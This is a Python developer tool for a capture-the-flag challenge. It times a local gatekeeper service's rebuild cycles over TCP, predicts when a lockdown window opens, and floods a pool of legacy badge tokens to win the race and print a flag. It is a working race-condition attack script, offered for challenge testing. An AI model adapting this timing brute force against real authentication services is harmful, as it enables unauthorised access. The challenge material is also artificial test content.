#!/usr/bin/env python3
"""
Dev tool: talks to gatekeeper.py directly on its loopback
port (9000), bypassing the Nightshift Bridge entirely. Useful for
testing the rotation/lockdown logic in isolation, but this is NOT the
player's path anymore -- players only ever reach bridge.py's web
console and WebSocket relay. See solve.py for the solver that
actually exercises what a player experiences.

Plain TCP sockets only -- no raw sockets, no scapy, works anywhere a
normal `nc` would, if you had shell access to run it from (you don't,
as a player -- this only runs from inside the container during dev).

Phase 1 - passive: open a MONITOR connection and keep it running for the
          whole session on a background thread. Jitter (window length)
          comes from the server's own embedded timestamps (start/end of
          the *same* cycle, so it's immune to client/server clock
          offset). Period comes from *our own local* arrival timestamps
          of consecutive REBUILD-START lines -- valid whether the solver
          runs on the same host as the challenge or across a real
          network, since one-way latency cancels out of a difference
          between two local receipt times as long as it's roughly
          stable. Each prediction extrapolates from the MOST RECENTLY
          observed marker, one period ahead -- not from whatever marker
          happened to be last when the script started -- so estimation
          error can't compound across many minutes of retries.
Phase 2 - predict the next window's local-arrival-equivalent instant,
          then shift it earlier by an estimated one-way latency (half
          the TCP connect() RTT) so the guess actually lands at the
          server when the window is open, not one latency hop late.
Phase 3 - pre-open a guess connection well before the predicted window
          (so TCP handshake latency isn't on the critical path), then at
          the predicted instant fire the whole candidate pool down that
          already-open socket. A single reader thread that lives for the
          whole connection (not one spun up per attempt) drains replies
          into a queue, so a retry can never have two readers racing
          over the same stream and stealing each other's response.
"""
import queue
import re
import socket
import sys
import threading
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9000

TOKEN_POOL = [f"legacy-badge-{i:02d}" for i in range(8)]
N_CYCLES_MIN = 6       # minimum cycles observed before the first attempt
PERIOD_WINDOW = 6      # how many recent cycles feed the period estimate
MAX_ATTEMPTS = 12


class Monitor:
    """Runs MONITOR in the background for the whole script lifetime,
    continuously refining the period/jitter estimate instead of trusting
    a single measurement taken once at the start."""

    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port))
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.sock.sendall(b"MONITOR\n")
        self.lock = threading.Lock()
        self.starts_local_ns = []
        self.jitters_ns = []
        self._pending_start_srv = None
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        f = self.sock.makefile("r")
        try:
            while True:
                line = f.readline()
                local_now = time.time_ns()
                if not line:
                    break
                m = re.search(r"seq_ts=(\d+)", line)
                if not m:
                    continue
                ts_ns = int(m.group(1))
                with self.lock:
                    if "REBUILD-START" in line:
                        self.starts_local_ns.append(local_now)
                        self._pending_start_srv = ts_ns
                    elif "REBUILD-END" in line and self._pending_start_srv is not None:
                        self.jitters_ns.append(ts_ns - self._pending_start_srv)
                        self._pending_start_srv = None
        except OSError:
            pass

    def wait_for_cycles(self, n):
        while True:
            with self.lock:
                if len(self.starts_local_ns) >= n and len(self.jitters_ns) >= n:
                    return
            time.sleep(0.05)

    def snapshot(self, window=PERIOD_WINDOW):
        with self.lock:
            starts = self.starts_local_ns[-window:]
            jitters = self.jitters_ns[-window:] or self.jitters_ns
        deltas = [b - a for a, b in zip(starts, starts[1:])]
        period_ns = sorted(deltas)[len(deltas) // 2] if deltas else None
        jit_hi_ns = max(jitters) if jitters else 90_000_000
        last_start_local_ns = starts[-1] if starts else None
        return period_ns, jit_hi_ns, last_start_local_ns


class GuessConn:
    """One TCP connection plus a reader thread that lives as long as the
    connection does, pushing every reply line into a queue. Keeping the
    reader's lifetime tied to the connection (not to a single attempt)
    is what prevents a retry's reader from racing a previous, still-alive
    reader over the same byte stream."""

    def __init__(self, host, port):
        t0 = time.time_ns()
        self.sock = socket.create_connection((host, port))
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.rtt_ns = time.time_ns() - t0
        self.replies = queue.Queue()
        self._thread = threading.Thread(target=self._reader, daemon=True)
        self._thread.start()

    def _reader(self):
        # Deliberately no socket timeout here: mixing settimeout() with
        # a buffered makefile() reader while another thread concurrently
        # sends on the same socket object (timeout is a socket-wide, not
        # per-thread, property) corrupts the buffered reader's state and
        # silently drops lines. A plain blocking read is correct --
        # conn.close() unblocks it with an OSError when we're done.
        f = self.sock.makefile("r")
        try:
            while True:
                line = f.readline()
                if not line:
                    break
                self.replies.put(line.strip())
        except OSError:
            pass

    def alive(self):
        return self._thread.is_alive()

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def try_window(conn, predicted_local_arrival_ns, half_rtt_ns, jit_hi_ns):
    # Don't fire once at a single predicted instant -- period/latency
    # estimates have noise on the order of a few ms, comparable to the
    # window itself. Instead fire continuously across a safety margin
    # that comfortably covers that uncertainty plus the documented
    # jitter bound, same approach as the raw-socket version used.
    lead_ns = 40_000_000
    tail_ns = max(jit_hi_ns, 90_000_000) + 60_000_000
    fire_from_ns = predicted_local_arrival_ns - half_rtt_ns - lead_ns
    fire_until_ns = predicted_local_arrival_ns - half_rtt_ns + tail_ns

    while time.time_ns() < fire_from_ns:
        pass  # busy-wait: this needs sub-ms precision

    payload = "".join(t + "\n" for t in TOKEN_POOL).encode()
    # Paced, not throttled with time.sleep() (observed to take ~10x the
    # requested duration here -- OS/VM timer granularity) and not an
    # unbounded tight loop either: sending as fast as sendall() allows
    # floods the server's single-threaded-per-connection processing loop
    # faster than it can keep up, which queues up a backlog -- so a guess
    # sent at exactly the right wall-clock instant can still be *read and
    # checked* by the server well after the window has already closed,
    # because everything sent moments earlier is still ahead of it in
    # line. Spacing rounds out with a busy-wait keeps the send rate
    # within what the server can actually process in real time, while
    # still being precise (unlike sleep()).
    round_interval_ns = 1_500_000  # ~100 rounds across a 155ms span
    rounds = 0
    next_round_ns = fire_from_ns
    while time.time_ns() < fire_until_ns:
        while time.time_ns() < next_round_ns:
            pass
        try:
            conn.sock.sendall(payload)
        except OSError:
            break
        rounds += 1
        next_round_ns += round_interval_ns
    print(f"[*]   sent {rounds} rounds of {len(TOKEN_POOL)} guesses")

    deadline = time.time() + 0.3
    seen = 0
    expected = max(rounds, 1) * len(TOKEN_POOL)
    while seen < expected and time.time() < deadline:
        try:
            line = conn.replies.get(timeout=0.05)
        except queue.Empty:
            continue
        seen += 1
        if line.startswith("OK "):
            return line[3:]
    return None


def main():
    mon = Monitor(HOST, PORT)
    print(f"[*] waiting for {N_CYCLES_MIN} rebuild cycles over MONITOR ...")
    mon.wait_for_cycles(N_CYCLES_MIN)

    conn = GuessConn(HOST, PORT)
    half_rtt_ns = conn.rtt_ns // 2
    print(f"[*] connect() RTT ~{conn.rtt_ns/1e6:.1f}ms -> using half as one-way latency estimate")

    for attempt in range(1, MAX_ATTEMPTS + 1):
        if not conn.alive():
            conn.close()
            conn = GuessConn(HOST, PORT)
            half_rtt_ns = conn.rtt_ns // 2

        period_ns, jit_hi_ns, last_start_local_ns = mon.snapshot()
        if period_ns is None or last_start_local_ns is None:
            time.sleep(0.5)
            continue

        next_local_arrival = last_start_local_ns + period_ns
        now_ns = time.time_ns()
        while next_local_arrival < now_ns:
            next_local_arrival += period_ns

        wait_s = (next_local_arrival - time.time_ns()) / 1e9
        print(f"[*] attempt {attempt}/{MAX_ATTEMPTS}: period={period_ns/1e9:.4f}s "
              f"jitter_hi={jit_hi_ns/1e6:.1f}ms predicted window in {wait_s:.3f}s")
        flag = try_window(conn, next_local_arrival, half_rtt_ns, jit_hi_ns)
        if flag:
            print("[+] FLAG:", flag)
            return
        print("[-] missed, trying the next predicted cycle...")

    print("[-] exhausted attempts; re-run to collect fresh timing.")


if __name__ == "__main__":
    main()
